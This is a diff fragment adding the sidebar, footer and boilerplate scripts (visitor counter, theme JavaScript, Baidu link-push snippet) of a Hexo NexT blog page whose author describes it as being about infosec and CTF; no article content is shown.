+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">all things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">NaNm</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">NaN:aN</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
